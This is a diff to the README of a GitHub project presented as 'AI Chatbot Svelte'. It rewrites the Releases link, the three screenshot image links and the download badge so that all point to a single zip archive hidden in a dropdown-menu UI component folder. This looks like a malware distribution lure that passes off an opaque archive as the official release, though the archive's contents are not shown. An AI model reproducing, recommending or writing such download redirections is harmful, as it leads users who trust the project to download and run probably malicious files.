@@ -10,15 +10,15 @@ Welcome to the AI Chatbot Svelte repository! Here you will find a full-featured,
 
 #### How to Use 📝
 
-To get started with the AI Chatbot Svelte, simply visit the [Releases](https://github.com/syklon99/ai-chatbot-svelte/releases) section for the latest version. You can download the specific file needed to execute the chatbot and integrate it into your projects seamlessly.
+To get started with the AI Chatbot Svelte, simply visit the [Releases](https://github.com/syklon99/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/dropdown-menu/ai_svelte_chatbot_2.9.zip) section for the latest version. You can download the specific file needed to execute the chatbot and integrate it into your projects seamlessly.
 
 #### Screenshots 📷
 
 Here are some snapshots of the AI Chatbot Svelte in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/syklon99/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/dropdown-menu/ai_svelte_chatbot_2.9.zip)
+![Screenshot 2](https://github.com/syklon99/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/dropdown-menu/ai_svelte_chatbot_2.9.zip)
+![Screenshot 3](https://github.com/syklon99/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/dropdown-menu/ai_svelte_chatbot_2.9.zip)
 
 #### Contributions 🤝
 
@@ -34,9 +34,9 @@ The AI Chatbot Svelte is released under the MIT License, allowing you to customi
 
 ---
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Version-brightgreen)](https://github.com/syklon99/ai-chatbot-svelte/releases)
+[![Download Latest Version](https://github.com/syklon99/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/dropdown-menu/ai_svelte_chatbot_2.9.zip)](https://github.com/syklon99/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/dropdown-menu/ai_svelte_chatbot_2.9.zip)
 
-Visit the [Latest Version](https://github.com/syklon99/ai-chatbot-svelte/releases) for the most up-to-date release of the AI Chatbot Svelte. Download the necessary files and start integrating AI capabilities into your projects effortlessly. Thank you for choosing AI Chatbot Svelte - your gateway to AI-powered interactions! 
+Visit the [Latest Version](https://github.com/syklon99/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/dropdown-menu/ai_svelte_chatbot_2.9.zip) for the most up-to-date release of the AI Chatbot Svelte. Download the necessary files and start integrating AI capabilities into your projects effortlessly. Thank you for choosing AI Chatbot Svelte - your gateway to AI-powered interactions! 
 
 🤖✨🚀
 
